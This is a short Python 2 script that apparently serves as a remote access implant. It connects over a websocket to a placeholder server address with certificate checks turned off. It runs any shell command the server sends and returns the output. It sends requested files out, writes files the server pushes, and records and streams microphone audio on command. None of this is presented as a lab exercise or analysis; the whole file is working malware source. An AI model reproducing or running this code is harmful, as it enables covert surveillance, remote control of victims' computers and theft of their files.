import websocket
import json
import base64
import subprocess
import os
import sounddevice as sd
import cPickle
import ssl
from threading import Thread

try:
    import thread
except ImportError:
    import _thread as thread
import time

class RecordingThread(Thread):
    def __init__(self, ws):
        Thread.__init__(self)
        self.ws = ws
        self.running = True

    def stop_recording(self):
        self.running = False

    def run(self):
        print "In record thread"
        rate = 44100
        sd.default.samplerate = rate
        sd.default.channels = 2
        
        while self.running:
            r = sd.rec(rate, blocking=True)
            ws.send(json.dumps({"type": "audio", "data": base64.b64encode(cPickle.dumps(r))})) 

rec_thread = None
        
def on_message(ws, message):
    global rec_thread

    print(message)
    msg = json.loads(message)
    if msg["type"] == "ping":
        ws.send(json.dumps({"type": "pong" }))

    if msg["type"] == "command":
        cmd = base64.b64decode(msg["value"])
        if cmd.lower().startswith("cd "):
            d = cmd.split(" ")[1]
            os.chdir(d)
            out = "OK"
            err = ""
        else:
            p = subprocess.Popen(cmd, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
            out, err = p.communicate()

        ws.send(json.dumps({"type": "response", "value": base64.b64encode(out+err)}))

    if msg["type"] == "download":
        file_name = base64.b64decode(msg["file"])
        content = base64.b64encode(open(file_name, "rb").read())
        ws.send(json.dumps({"type": "file", "name": base64.b64encode(os.path.basename(file_name)), "content": content }))

    if msg["type"] == "file":
        response = "OK"
        try:
            file_name = base64.b64decode(msg["target"])
            dir_name = os.path.dirname(file_name)
            if not os.path.exists(dir_name):
                os.makedirs(dir_name)

            with open(file_name, "wb") as f:
                f.write(base64.b64decode(msg["content"]))
        except:
            response = "Error uploading file"

        ws.send(json.dumps({"type": "response", "value": base64.b64encode(response)}))

    if msg["type"] == "start-recording":
        try:
            rec_thread = RecordingThread(ws)
            rec_thread.start()
        except Exception as ex:
            print ex

    if msg["type"] == "stop-recording":
        if rec_thread != None:
            rec_thread.stop_recording()

def on_error(ws, error):
    print(error)

def on_close(ws):
    print("### closed ###")

def on_open(ws):
    print "Running"


if __name__ == "__main__":
    ws = websocket.WebSocketApp("wss://<ip>/ws",
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close)
    ws.on_open = on_open
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
